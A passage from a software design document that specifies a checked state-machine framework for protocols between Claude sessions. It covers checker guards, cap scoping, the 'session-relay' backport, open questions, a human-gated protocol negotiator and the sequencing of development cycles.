- a guard names a **declared** field (G1) and a **declared** register (G2);
- the field's **type supports the comparison** — equality on either declared type, ordering
  only on `int` (G3), and the guard's field and its register's field are the same declared
  type (G4);
- the remembered value a guard compares against is **derivable from the trace**, not from
  anywhere else — this needs no code, because the syntax admits no other source: a register's
  only declared source is a fold over a field of messages of a declared kind, and there is no
  spelling anywhere in this schema for a register to come from anything else.

Guards also changed what two guarded transitions sharing a trigger may mean: two members that
share `from`, `on` and `by` but disagree on `to` are accepted **only** when every one of them
carries a guard, all of those guards compare the same field to the same register, and no two
of their operators' atom sets intersect — a strengthening of the determinism check this
section already had, not a separate rule beside it. **No guard-free machine's verdict
changed**: a transition with no guard, or a guard naming a different field or register than
the rest of its group, is reported exactly as an unguarded pair always was.

And one thing the checker deliberately does **not** report: a guard that can never fire. The
abstraction is what makes the rest decidable, and it is exactly what throws away the
information needed to find a dead branch. **A loss of precision, stated, rather than a
soundness claim that is not true.**

### The cap check, strengthened in cycle A.1

**Weak at cycle A, strengthened in cycle A.1.** `claude-plugins#28`, second comment.

Cycle A's `check_machine` measured the shortest run from `initial` to an accepting state and
counted the signalling transitions on it. **If `initial` was itself accepting, that count was
0, and no positive cap could ever be reported.**

`session-relay` has exactly that shape. Its `unopened` state is initial and is accepting,
because the initiator has filed nothing and owes nothing (§10, row 6). **So the shipped
fixture no longer exercised the check at all**, and a machine built inside the tests had to
take over that job.

**Cycle A.1 shipped the stronger form, and it is not the sentence this section used to
propose.** The check now asks the question from every **subject** — every state reachable
from `initial` that is neither accepting nor terminal, i.e. every state where something is
still owed and the run can still move — rather than only from `initial`:

> **From every subject, an *accepting* state must be reachable within `cap` signalling
> transitions.**

**The goal set is the accepting states, and only the accepting states — not `accepting |
terminal`.** An earlier draft of this sentence said *"an accepting or a terminal state must
be reachable"*, which is right for the check that asks whether a run can escape limbo at all
(§4's *"every state must be able to reach an accepting or a terminal state"* — an abort
escapes limbo, so a terminal state counts there) and wrong for this one, which asks whether
the declared budget buys somewhere *good*: a state where nothing is owed on purpose, not a
state the run gave up in. An abort is not somewhere good. Two checks, two questions, two goal
sets; widening this check's goal set to match the escape-limbo wording is how a later session
would "fix" the shipped cap check into a regression — it would make a cap that only reaches
the error state look satisfiable, when it is exactly the cap that cannot be satisfied. A test
now fails if the goal set widens.

A subject's route cost depends on the cap's scope, `per` (§7, §11.12): under `channel`, every
role's signalling transitions draw from the one shared budget, and the cost is the fewest
signalling transitions on the cheapest route, computed for every subject at once. Under
`role`, the cost that matters is the *worst single role* on the route, because each role is
capped separately; a subject whose channel-scope route already fits is satisfiable under
`role` scope for free, and whatever is left needs an actual search, bounded before it runs —
see "What the checker cannot check", below, for `_MAX_CAP_SEARCH`'s silent path.

It remains skipped entirely when no cap is declared — §7's rule that an absent cap means *no
bound*, not a default, is untouched.

**This was checker work, not engine work, and A.1 delivered it.**

### What the checker cannot check, and will not pretend to

- **`accepting` has no structural cross-check, and cannot have one.** `terminal` is
  cross-checked against a state's out-degree; `holder` is cross-checked against each outgoing
  `by`. `accepting` is cross-checked against nothing, because *"is anything owed here"* is a
  question about meaning and the checker checks structure. An author who marks a waiting
  state accepting passes every check. **This limit is permanent, and `SCHEMA.md` now says
  so** — cycle A.1 added it — rather than leaving a reader to assume the mark is verified. The
  conservative default (`false`) makes the *common* mistake — marking nothing — loud; it does
  nothing about the deliberate one. See §11.9.
- **A branch whose every route ends badly is not reported, and that was decided rather than
  overlooked.** A non-accepting state whose every future is a terminal non-accepting state is
  legal on purpose. *"Once the versions are incompatible, every route aborts"* is a true thing
  to declare, the schema has no field with which an author could confirm they meant it, and
  the checker has one severity — so the report would be an unsuppressible false positive on a
  valid machine. **Refused.** It is the first candidate for a non-fatal tier if one ever
  exists. See §11.8.
- **A per-role cap search past a stated size gives up silently on the one subject it
  concerns, rather than refusing to analyse it or hanging — a third thing the checker does
  not tell you.** The per-role cap check's second phase (the cap-check subsection above)
  searches a space of `states × (limit + 1) ^ roles`; past roughly a million such states,
  `_MAX_CAP_SEARCH` stops that one subject's search and reports nothing about it, the same
  direction this section already takes for the guard abstraction and for a doomed branch,
  above. Because a cheapest route is always a simple path, no subject's channel-scope
  distance can exceed `states - 1`, so this search is reached at all only when
  `limit ≤ states - 2` — measured, it is never consulted below 17 states at 4 declared
  roles, 9 states at 6 roles, or 33 states at 3 roles, always with `limit` at or near
  `states - 2`. Neither of this cycle's shipped declarations comes close: `session-relay`
  (5 states, `limit: 10`, 2 roles) and `paxos-acceptor` (5 states, `limit: 6`, 2 roles) are
  both settled by the free, per-channel clearance alone and never reach this search at all.

**This subsumes the router.** An unclaimed prefix is a machine-not-found, reported rather
than dropped. Two protocols claiming one prefix are an installation error rather than a
runtime race. The router repository's first issue can close when this lands.

## 10. The backport, which is the framework's first test

Re-expressing a protocol already known to work asks: *can the formalism express it?* The
handoff's seven rows were first walked against the design on paper, where **all seven are
expressible** — across the three layers of §4, not all of them inside the declaration. Two
results from that walk are worth recording. §13 then required the walk to be run again against
the schema as shipped, before cycle B starts. It has been, and **the shipped result is not the
paper result**; it is below, after the two.

### Row 7 — the row that decides whether the framework earned its place

*"The signal and the header can disagree about `blocking`; the signal wins."* `#17` records
this rule as correct and never fired, because it was written as a condition and nothing told
a session to compare.

The framework expresses it, but **not by encoding the rule better**:

> The fold has to read both. To compute current state the engine reads the thread's newest
> protocol header; to dispatch at all it has already parsed the inbound signal. Both values
> are in hand before any verdict exists. The comparison is not a rule the engine follows —
> it is a value the engine cannot avoid producing.

**A computation that always runs cannot be skipped.** That is the same fix
`handling-an-inbound-ping` §2 made by hand when it rewrote the rule as a step; the engine
removes the need for the rewrite.

### The finding — "four guards in fixed order" is not expressible

The guards do not survive as an ordered list. They distribute across the three layers: guard
1 (is this ours) and guard 2 (version) become the dispatcher; guard 3 (bound, then enabled)
becomes a channel precondition; guard 4 (kind in vocabulary) becomes the machine's alphabet.

By the handoff's own test — *"every part it cannot express is a framework defect"* — this is
a defect. **This design argues it is the good kind, and flags the argument rather than
burying it:** the ordering existed because one skill had to do all four in sequence. Split
across layers, the order is structural rather than remembered.

It also disposes of the guard-3 exemption. Control replies skip guard 3 today as a stated
exception; in the layered model they have no channel at all, so a channel precondition
cannot apply to them. `whois` is the one control message that *asks* the ownership question,
so it is the addressing machine's input rather than an exception to anything.

### The walk run against the shipped schema

§13 calls this walk the cheapest defect-finder in the design. It was run during cycle A against
the schema as `plugins/machines/` implements it, rather than against the design on paper, and
it found a defect nothing predicted — which is the outcome it was written to produce.

- **Rows 1 and 2 fail, as this section predicted.** They are the guards, and the prediction
  that they dissolve into the dispatcher, the channel precondition and the machine's alphabet
  held. **One thing this section did not state:** the absence of an epsilon transition is a
  **limit of the schema**, not merely a choice about layering. A later cycle cannot express
  *"advance without a message"* without changing the schema.
- **Row 6 fails, and nothing predicted it.** *"The issue body is the first comment, `seq=1`"*
  was not expressible: there is no `seq`, no counter, and no way to say that the channel's
  creation is itself the first word. The shipped fixture showed the residue — it declared the
  kind `triage` with no transition firing on it, because the triage message *is* the issue
  body. Cycle A models it instead with an explicit `unopened` state held by the initiator and
  a `triage` transition out of it, which is arguably more honest than the prose it replaces:
  filing the issue is an act someone takes, not a state the world is in. **`unopened` is
  accepting** — before anything is filed nobody has been told anything and nothing is owed —
  and because it is also `initial`, `session-relay`'s shortest signalling run to an accepting
  state is zero transitions long, so its `cap: 10` is no longer compared against anything. That
  is the correct answer under the accepting-state model rather than a hole, but it means the
  shipped fixture stopped exercising the cap check and a machine of its own had to take over
  that job in the tests.
- **Row 7 is not expressible in the declaration, and correctly so.** That is what the
  subsection above already argues — the comparison is a value the *engine* produces, not a
  rule the declaration encodes — and nothing on this branch claims otherwise. Cycle B is where
  it can be settled.

  **Guards change what row 7 *could* be, and must not change what it *is*.**
  `claude-plugins#31` cites row 7 as its motivation, and once `blocking` is a typed
  field a guard could compare the two values. **That would be a worse answer than the one this
  section already has.** A guard is a rule an author remembers to write; the engine's
  comparison is a value it cannot avoid producing, and *"a computation that always runs cannot
  be skipped"* is precisely why `#17`'s rule failed the first time. So: the engine produces the
  comparison and reports it, as before. A guard over `blocking` is available to an author who
  wants a transition to *refuse* on the disagreement rather than proceed and report it — which
  `session-relay` explicitly does not want (its rule 4 says use the signal, continue, and
  report). Cycle B implements the engine's comparison. It does not implement row 7 as a guard.
- The remaining rows land in the schema as written.

**What the schema cannot express, which is cycle B's input.** This is one list, not two:
`claude-plugins#28`'s first comment records the same walk and its seven numbered
items are the same items. **Each now carries its disposition**, agreed on 2026-09-15, so that
a reader of either document gets the same answer:

| # | What the schema cannot express | Disposition |
|---|---|---|
| 1 | a cap scoped per sender or per channel — a declared cap is one number for a run, and a machine may now decline to declare one at all | **settled in cycle A.1** — the schema gained `cap: { limit, per }`, scoped per `channel` or per `role` (not per sender, which has no field to name it by). See §11.12 |
| 2 | any message attribute beyond `kind`, so `blocking=`, `seq=` and `ref=` are invisible to it | **splits into three** — see below |
| 3 | a guard on a transition | **settled by `#31`** — §7's typed fields and guards, built in cycle A.1 |
| 4 | an epsilon or otherwise internal move. Every transition needs a `kind`, so a state that consumes nothing cannot be left. This is a **limit of the schema**, not merely a consequence of the layering | **open, and now consequential** — see §11.10, where it is what bounds the uncapped-local-loop gap |
| 5 | an initial state that is the channel's creation | **settled in cycle A** by the explicit `unopened` state and a `triage` transition out of it |
| 6 | an effect attached to a state rather than to a transition, so a terminal state with two incoming transitions repeats its effects | **open** |
| 7 | a machine identity qualified by publisher | **open, and it is a live hole, not only a limitation** — §9's collision skip keys on `name` alone |

**Item 2 splits, and cycle B must not treat the three fields alike:**

- **`blocking=` becomes a typed header field** a guard may test (§7). It is the one of the
  three that is genuinely protocol, because row 7's disagreement is a comparison of two
  values the protocol cares about.
- **`seq=` does not become a field at all.** Order moves to the envelope, invisible to the
  machine (§4). See the subsection below, which is where the two documents most easily
  drift apart.
- **`ref=` is sender identity**, which the envelope already carries; it needs nothing from the
  declaration.

**Two things on the old list are not gaps in the schema and have moved**, because leaving them
here invited a later cycle to try to fix them:

- **an obligation, as anything a checker could derive** — `accepting` is a declared assertion
  with no structural cross-check, and it can never have one. Moved to §9, stated as a
  permanent limit rather than an outstanding item.
- **"every route from here ends badly"** — considered and **refused**, not left open. Moved to
  §9, with the reason. §11.8 records the refusal.

### `session-relay`'s `seq=` and the envelope's clock are different quantities

**This is the contradiction most likely to be folded in smoothly, so it is written out.**
`claude-plugins#32` says its change *"re-expresses a field that a real protocol
already needed. It does not invent one"*, and cites `session-relay`'s `seq`. Checked against
`docs/superpowers/specs/2026-09-13-session-relay-design.md` on 2026-09-15 — **the two are not
the same quantity, and the clock cannot take `seq`'s place.**

| | `session-relay`'s `seq=` | the envelope's clock |
|---|---|---|
| counts | that sender's own comments on that issue | `max(seen) + 1` over every message on the channel |
| scope | per sender, per issue, starting at 1 | per channel |
| answers | how many of my ten I have spent | had this sender read what I wrote |
| rendered | yes — the visible line reads `3 of 10` | no |

Under strict two-party alternation a Lamport clock interleaves: one side's messages carry
1, 3, 5… and the other's 2, 4, 6…. **A sender's tenth message therefore carries a clock of
about 19.** A backport that rendered the visible line from the clock would print `19 of 10`
— which is §2's finding 1 (*the stalemate comment renders `11 of 10`*) made worse and made
silent, on a protocol whose whole cap discipline that line communicates.

**So neither supersedes the other, and the honest statement is a split:**

- the clock supersedes `seq`'s **ordering and duplicate-detection** duty, which `seq` did
  badly anyway — a per-sender counter detects nothing about what the sender had read;
- **the engine's verdict supersedes `seq`'s counting duty.** `remaining` (§6) is computed by
  folding the trace, so the count stops being a number a sender maintains and can get wrong.
  That is the same move as the cap becoming structural.

**Cycle D must not name the clock `seq=`.** `session-relay`'s own design refuses to call the
reply subject `ref` on the grounds that one word with two meanings is what `tracking-work`
forbids; reusing `seq` for a value with different arithmetic, on a live protocol whose
readers already read it as *"3 of 10"*, is the same defect with a live audience.

### The addressing half has no channel, and that is a gap in the model

**Found 2026-09-15**, `claude-plugins#28`, third comment. The walk above said the
control vocabulary — `whois`, `mine`, `not-mine`, `not-enabled`, `unsupported` — is
expressible as a second machine with its own prefix. **The walk did not ask what that second
machine would fold over. It folds over nothing.**

A `whois` goes from one session to another by `SendMessage`, and the answer returns the same
way. Neither message is written to an issue. **Nothing durable records that the exchange
happened**, and a machine's state is a fold over a channel's trace, so a machine with no
trace has no state.

**The prefix split is not the problem.** Pattern prefixes separate the two halves provably:

```
session-relay:v1 (whois|mine|not-mine|not-enabled|unsupported) 
session-relay:v1 (triage|question|answer|conclusion|stalemate) 
```

These are disjoint, and the checker proves they do not collide. **The absent channel is the
problem.**

**The recommendation is that addressing is floor, not protocol.**
`claude-plugins#26` requires a floor nobody negotiates, and §12 already names one —
the dispatcher, the prefix, and *"no machine claims this"*. Addressing belongs there, in the
same way DNS sits below HTTP and is not expressed in HTTP: a session finding the session that
owns a repository is a thing that happens *before* any protocol runs.

The alternative is a second kind of channel that keeps no durable trace, with a machine's
state living only in the session that holds it. **That adds a second state model to a
framework whose single state model is its main simplification**, and it buys nothing: no
person ever needs to replay a `whois`. Cycle D must choose one of the two explicitly; §11.11
carries the decision.

**This also tidies something §10 already half-said.** The guard-3 exemption paragraph above
notes that control replies *"have no channel at all"* in the layered model. That was written
as a convenience — the exemption dissolves — and it turns out to be the finding: having no
channel is not only why a channel precondition cannot apply to them, it is why they cannot be
a machine.

### What the backport cannot test

**Delegation.** `session-relay` is strictly two-party, and the live test met that limit on
its first run: the authoring session found no grader in its own repository and said the cause
might be in a released package or the runner — a third place it had no way to hand the thread
to. The channel layer is designed for delegation anyway. **A passing backport is not evidence
that delegation works.**

## 11. Open, and explicitly not settled

1. **The trigger.** Whether a hook sees an inbound cross-session message is **unmeasured** —
   see §3. Until it is settled the dispatcher is specified as a `bin/` tool with a hook as an
   optional front end, and **guard 1 is prose, not structure**, and the design says so.
   Cycle A did not settle it: the spike recorded in §3 is still the only attempt, and it
   still measured nothing. **The empty log is not a result.**

   **How to settle it**, since the throwaway hook was removed when cycle A closed and no
   longer sits anywhere waiting to fire: register a `UserPromptSubmit` hook in a project's
   `.claude/settings.local.json` that logs its stdin, **start a new session** so the hook is
   loaded at startup, and have a peer send a message. The measurement only means something
   if a **positive control** fires in the same session — an ordinary user prompt must reach
   the log. Without that control an empty log distinguishes nothing, which is precisely how
   the first attempt failed.
2. **A thread whose machine is uninstalled or upgraded mid-conversation.** Proposal: the
   trace already names protocol and version; `~/.claude-machine/` keeps old versions; a
   thread pins the version it opened with; uninstalling a machine with live threads warns
   and names them.
3. **Update notification.** Record the installed ref, compare against the remote tag on a
   timestamp gate, report. **Never auto-update.**
4. **What bounds delegation.** `#26` requires that delegation be bounded by something
   stated. This design has not stated it.
5. **The transport's language and invocation mechanism.** Still open. What its *declaration*
   must contain is no longer open — a verb set with typed arguments, a mark on every verb that
   reaches outside the channel, and one statement of whether the channel gives a total order
   (§8) — but the file format that carries it, and how the engine calls a verb, are not
   decided. It is cycle C's, because the installer is what reads and displays it.
6. **What the cap counts — settled during cycle A, recorded here so it cannot drift back.**
   §7's own wording was ambiguous: *"counts only outbound messages the machine emits"* and
   *"caps transitions, not comments"* are not the same rule, and cycle A had to pick one to
   implement. It is resolved as **only signalling transitions**, matching the stated
   decision to *"count only the outbound messages sent from a state machine"*, and §7 now says
   so. The ambiguity was in the design rather than in the implementation, which is why it is
   recorded here: a later cycle reading the old wording would reintroduce it.
7. **Where prefix validation lives — resolved in cycle A.1.** `check_machine` now calls
   `prefix_problem` itself, so a caller who uses `check_machine` directly — the documented
   answer to *"is this machine well-formed"*, and what cycle B's engine will do — gets prefix
   validation without also running `check_all`'s pairwise collision check. `check_all` still
   calls `prefix_problem` too, to decide which machines are fit to compare for a collision;
   the two calls answer different questions and neither makes the other redundant.
8. **Whether a branch whose every future ends badly should be reported — settled on
   2026-09-15: do not report it.** A non-accepting state that can reach only terminal
   non-accepting states commits the run, on entry, to ending with something still owed.
   Sometimes that is a bug; sometimes it is a correctly modelled doomed branch, and *"once the
   versions are incompatible, every route aborts"* is a true declaration. **Refused because it
   is unsuppressible:** there is no field with which an author could say "yes, I mean it", and
   the checker has one severity (a problem, exit 1), so every correctly-declared doomed branch
   would be reported as a defect. An unsuppressible false positive on a valid machine is worse
   than a missing finding. **It stays first in line for a non-fatal tier if one is ever added**
   — which is the only thing that would change the answer. §9 carries the refusal where a
   reader of the checks will meet it.
9. **`accepting` is a declared assertion with no structural cross-check, and the limit is
   permanent.** `terminal` is cross-checked against a state's out-degree and `holder` against
   each outgoing `by`; `accepting` is cross-checked against nothing, because "is anything owed
   here" is a question about meaning, not a graph property. An author who marks a waiting state
   accepting passes every check. The conservative default makes the *common* mistake (marking
   nothing) loud; it does nothing about the *deliberate* one. **`SCHEMA.md` now says the mark
   is unverified** — cycle A.1's documentation task added it, in close to these words:
   *"nothing here can confirm that a state a publisher marked accepting really is a fine
   place for a run to stop"* … *"Trusting `accepting` means trusting whoever wrote it."*
   Whether a heuristic is worth having — a state whose outgoing transitions are all `by` a
   role other than its own `holder` is where waiting happens — is untested and unproposed.
10. **The uncapped local loop, and whether it needs a second bound.**
    `claude-plugins#28` states it as a requirement: the cap counts only signalling
    transitions, so a machine can loop on `signal: false` moves for ever, reach a terminal
    state, and pass every check — *"cycle B must add a second bound. The cap limits the
    conversation. A second bound must limit the run."*

    **The requirement is right that the hole exists and, as argued, overstated. Two reasons,
    and cycle B should settle them before adding a field:**

    - **The loop needs fuel that the schema cannot supply today.** Every transition requires a
      `kind` (§10, item 4 — there are no epsilon moves), so a local move consumes a word from
      the trace. Words enter the trace by being written to the channel. So the free loop is
      not reachable from the shipped schema; it becomes reachable exactly when a later cycle
      adds a `wait` verb or an epsilon move, which is what the evaluation that found it
      assumed. **The bound is a precondition on adding those, not work cycle B owes on its
      own.**
    - **`#34` may close it without a new field.** If a world read can influence the fold only
      by something writing a message into the channel, then the loop's every iteration is a
      **channel write** — and a channel write is an outbound message, which the cap already
      counts. The gap then reduces to a definition: `signal: false` currently means *"emits no
      signal to a peer"*, and what the cap wants is *"writes nothing to the channel"*.
      **Proposal, mine, not the author's: redefine the cap to count transitions that write to
      the channel, and make a transition that writes to the channel while declaring
      `signal: false` a checker error.** That is one rule rather than two bounds, it is
      checkable statically, and it does not put a second number in front of a publisher.

    **A second *declared* bound is the option to avoid.** §4 and §7 spent a correction
    establishing that the framework does not require a protocol to terminate, and that an
    absent `cap` means no bound rather than a default. A mandatory second bound would walk that
    back for every machine, including the continuous ones. If a bound is needed after both
    points above, **make it an engine-side limit on one fold** — a runtime refusal to take
    unbounded steps, reported in the verdict — not a field an author must fill in.
11. **Whether addressing is floor or a second kind of channel.** §10 records the finding —
    `session-relay`'s addressing half has no durable trace, so it cannot be a machine — and
    recommends **option 1: addressing is floor**, implemented by the framework, declared by
    nobody. Option 2 is a second channel kind with no durable trace, whose state lives only in
    the session that holds it. **The decision belongs to cycle D**, which is where
    `session-relay` is re-expressed and where the cost of either choice is real. Option 1 is
    the recommendation and nothing here has ruled option 2 out.
12. **The cap's scope — found on 2026-09-15, and settled in cycle A.1.** §6's verdict
    promised `remaining` as *"cap headroom for this sender on this channel"*. §7 declared the
    cap per bundle, as one number for a run. §10's item 1 recorded per-sender and per-channel
    scoping as something the schema could not express. **All three could not be true.** It had
    been invisible because nothing had to compute the number yet; the engine is the first
    thing that does, so cycle B could not start without an answer. Two ways out, and they cost
    differently:

    - **Re-specify `remaining` as run headroom.** Cheapest, and it makes §6 honest about what
      §7 declares. The price lands on cycle D: `session-relay`'s cap is *ten comments per
      sender per issue*, so the backport would have to express something the schema does not
      have, and this is the second time that protocol's real shape has pushed against a
      framework-wide single number (§10, row 6 was the first).
    - **Give the cap a scope in the declaration** — per run, per sender, per channel. This is a
      schema change and therefore A.1 work (§13), not B work, and it is the option that leaves
      the backport expressible.

    **The author chose the second option, and cycle A.1 shipped it — with a narrower scope
    than this item first proposed.** `cap` may now be written `{ limit, per }`, `per` one of
    `channel` (a bare `cap: 10` still means this) or `role` — **not `sender`**. This
    declaration language names `roles`, checked against every `holder` and `by`; it has no
    field that names who sent one particular message, so `per: sender` is rejected by name
    rather than accepted as another spelling of `role`. `role` and a genuine per-sender count
    are the same thing only as long as exactly one participant ever holds a given role in a
    run, which every declaration in this cycle assumes; a cycle that let more than one
    participant share a role would need its own narrower scope. §6's `remaining` is settled
    the same way — see there.
13. **What the clock's scope is when a channel is not an issue.** §4 fixes the clock per
    channel. `session-relay`'s `seq` is per sender *per issue*, and the two upstream comments
    on a linked issue are a separately capped thread from the downstream discussion — so
    "channel" and "issue" coincide there by accident of that protocol's shape. A transport
    whose channel spans several venues has not been designed, and the clock's scope would have
    to be restated for it. **Not a problem today; a thing to notice before it becomes one.**

## 12. A protocol negotiator, in three stages

**Not part of cycles A–D.** Agreed as scope after them, and sequenced so each stage is useful
alone and de-risks the next.

**The bootstrap is not circular.** `#26`'s first objection is that a negotiation framework is
itself a protocol, so a floor has to exist that nobody negotiates. The floor already exists —
the dispatcher, the prefix, and *"no machine claims this"*. The negotiator is **a declared
machine shipped built-in, with a fixed prefix, always installed, never negotiated.** It gets a
checked by the same checker as everything else. **A negotiator is one of the protocols that
genuinely should terminate**, so it declares a cap and a terminal state and the checker holds
it to them — but it does so because the negotiator's own declaration says so, not because the
framework requires it of every machine (§4).

### Stage 1 — the offer (folds into cycle D; cheap)

When no machine claims a conversation, say so and offer to help declare one. The dispatcher
already has to report an unclaimed prefix rather than drop it (§9); this extends the report
into an offer. It is a skill, not a mechanism.

**Why it comes first:** without it, only someone who already knows the framework exists will
ever use it. That is the discoverability trap `session-relay`'s "offer once" rule was written
to solve.

### Stage 2 — selection, and role occupancy

A built-in negotiator machine lets sessions agree which **already-installed** machine to use.
No authorship happens here: it is a handshake over the intersection of what each side holds.

**The dynamic cluster is role occupancy, not participant creation.** A machine declares N
roles, fixed at declaration time. A session joins by taking a vacant role and leaves by
releasing it. The roles are fixed; who holds them is dynamic.

**Why the line is drawn there.** Dynamic join and leave with unbounded participants is full
π-calculus mobility, which §7 forbids because the properties go undecidable — costing the
install-time check, the one thing the framework exists for. A fixed role set stays inside
multiparty session types, where projection to per-role machines is a solved problem. The
undecidable version buys unbounded *new* roles, which is not what was asked for.

### Stage 3 — authorship

Sessions author a new declaration; the checker gates it; a person adopts it.

**The property that makes this safe:** negotiation produces **data, never code**. A negotiated
machine composes an **already-installed** transport with a **new declaration**. Two sessions
inventing a protocol cannot introduce executable anything — they are filling in a form whose
grammar the checker validates.

**The division of labour, which is the whole design:**

| Who | Does |
|---|---|
| the sessions | the creative part — what states, what kinds, what the protocol should be |
| the checker | the deterministic part — well-formedness, that a run can always reach somewhere it may stop, a declared cap, prefix collision |
| the person | the authorising part — adoption |

Nothing is adopted because two sessions agreed it was fine.

**This is the cure for `#24`, not a relapse into it.** The failure there was never invention —
the six conventions were all good rules. It was that the agreements were invisible,
pair-specific, renegotiated each time, and detectable only by a person watching. A negotiated
machine that is written to a file, checked, and surfaced has none of those four properties.

**Agent-effects (§6) raise the stakes here, and the gate has to account for it.** A negotiated
machine can name an effect Claude performs, so two sessions are no longer only agreeing
turn-taking — they are authoring something that can require Claude to act. A negotiated machine
is therefore **inert until a person adopts it**, and adoption is explicit.

## 13. Sequencing — this is more than one plan

Four cycles, each with its own plan and its own verification. Each one is useful alone, and
each one can find a defect before the next depends on it.

| | Delivers | Why this order |
|---|---|---|
| **A** | the declaration schema + the checker | The checker is the framework's reason to exist, it needs no transport, no engine and no installer, and it can be run against a hand-written declaration. If the formalism cannot express `session-relay` on paper, that is found here, cheapest. **Shipped** |
| **B** | the engine — fold, verdict, outbound gate; **and, added 2026-09-15:** guard evaluation at run time (§7), the envelope's clock and the order verdict (§4), and the rule that the engine never branches on a world read (§6) | Needs A's schema. Testable against a recorded thread with no transport at all, because a fixture is just the JSON a transport would have returned |
| **C** | the installer, the registry, `/machines:install` | Needs A's checker to have something to run at install. This is the cycle that writes to `~/.claude-machine/` and asks for consent, so it is the one with outward-facing behaviour. **It now also carries the transport declaration** — the verb set with typed arguments, the world-touching marks and the total-order statement (§8) — because that is the file the installer reads and shows |
| **D** | the dispatcher + the `session-relay` backport | Needs all three. The backport is the test of the whole, and §11.1's trigger measurement gates only this cycle. **It must decide §11.11** (addressing: floor, or a second channel kind) and must not rename the clock to `seq=` (§10) |

**Do not start B before A's schema has expressed all seven backport rows on paper.** That
walk is the cheapest defect-finder in the whole design, and it costs nothing but reading.
**It has now been run** — §10 has the result. It found a defect nothing predicted, which is
the argument for it.

### Cycle A.1, delivered ahead of B

**This was a proposal from the session that folded the 2026-09-15 amendments in. The author
accepted it, and cycle A.1 shipped in `plugins/machines/` on 2026-09-15 — the table below
records what was proposed; the paragraph after "the three shipped defects in §9", further
down, records what did and did not land.**

Three of the things this amendment added were **not engine work**:

| | Work | Why it is not B |
|---|---|---|
| 1 | the stronger cap check — from every subject (a state reachable from `initial` that is neither accepting nor terminal), reach an *accepting* state within `cap` (§9) | A graph property of a declaration. The engine never computes it |
| 2 | moving prefix validation from `check_all` into `check_machine` (§11.7) | Pure checker tidying. Nothing in the engine reads a prefix |
| 3 | typed header fields and guards, **and the checker's two-outcome abstraction of them** (§7, §9) | The abstraction is what keeps §9 decidable. It is a property of the checker, and the fields themselves are a **schema** change |

**The recommendation was that these become a small cycle A.1, sequenced ahead of B, rather
than being absorbed into B — and that is what happened.** The argument turned on one thing,
and it is item 3:

> **Item 3 changes the schema, and B's entire charter is "needs A's schema".** A plan for the
> engine written against a schema that the same cycle is still amending has no fixed input.
> Guards are the clearest case: the engine's job is to *evaluate* a guard, and it cannot be
> specified — let alone verified against a fixture — until the guard's fields, types and legal
> comparisons are settled and the checker enforces them. Cycle A's stated deliverable is "the
> declaration schema + the checker". A schema change belongs there by the division of labour
> this table already uses.

Items 1 and 2 do not need their own cycle and would not justify one alone. They ride along
because they are small, they touch the same two files as item 3, and folding them into B
would put checker changes inside a cycle whose verification is about the engine — which makes
B's verification report ambiguous about what was actually tested.

**What A.1 is not.** It is not a place to put the transport declaration. The verb set, the
world-touching marks and the total-order statement are read by the *installer*, so they stay
in C (see the table above), and §9's effect-against-transport check lands when C does. A.1
would also **not** settle §11.10's second bound: the proposal there is a redefinition of what
the cap counts, which depends on §8's classification landing first.

**Of the three shipped defects in §9, A.1 delivered one.** Prefix validation's home moved
into `check_machine` (§11.7). The collision skip keyed on `name` alone, and unbound `roles`
values, were proposed here as natural contents of A.1 alongside items 1 and 2, for the same
reason — they are checker bugs, and B's verification should not be the place they get fixed —
**but A.1's ten tasks did not include them; both are still open.** Whoever picks them up next
should still do it as the same kind of small checker fix, not fold it into B's verification.

**The fallback this proposal offered, not taken:** if the author had preferred not to add a
cycle, the alternative that preserved the argument was to **land item 3's schema change as
the first, separately verified half of B**, and accept that B's plan could not be written
until that half was done — a cycle A.1 with a different name, kept distinct from B because
§13 already promises each cycle its own plan and its own verification. The author chose the
named cycle instead.

**What B inherits.** A.1 leaves cycle B a schema that no longer moves under it: typed header
fields (`int`, `bool`), registers (`max`, `last`), guards (`eq`, `ne`, `lt`, `le`, `gt`,
`ge`) and their determinism rule, and a cap that is scoped (`channel` or `role`) and checked
from every subject against the accepting states. B's job stays what §13's table above says —
fold, verdict, outbound gate, guard evaluation, the clock, the order verdict, and the rule
that the engine never branches on a world read — against that fixed input, not a moving one.

## 14. Non-goals

- The framework does not check meaning, and no part of it may appear to.
- The framework does not execute the declaration's *machine* — only its own engine runs.
- The framework does not vouch for a publisher's transport code.
- No daemon, no poller, no watcher, no runtime state store. The durable record is the trace.
  **A publisher's transport may block** — §8's `wait` — and that does not breach this line: it
  is publisher code, called synchronously inside one turn, under install-time consent, holding
  nothing between calls. The framework grows no process of its own.
- **The engine does not branch on anything outside the channel.** A world read reaches the
  conversation only as a message somebody wrote into the channel (§6, §8). Without that, the
  trace stops being enough to rebuild the conversation, and the trace is all there is.

## 15. Housekeeping carried into the plan

- `.claude/settings.local.json` in this worktree holds the **throwaway** spike hook. It is
  untracked, this repository has **no `.gitignore`**, and it must not be committed. Remove it
  once the §11.1 measurement is taken.
- `session-relay` is written, reviewed and pushed at `origin/session-relay`, **not merged**,
  and its branch is behind `main`. It is held by another session; it is not this work.
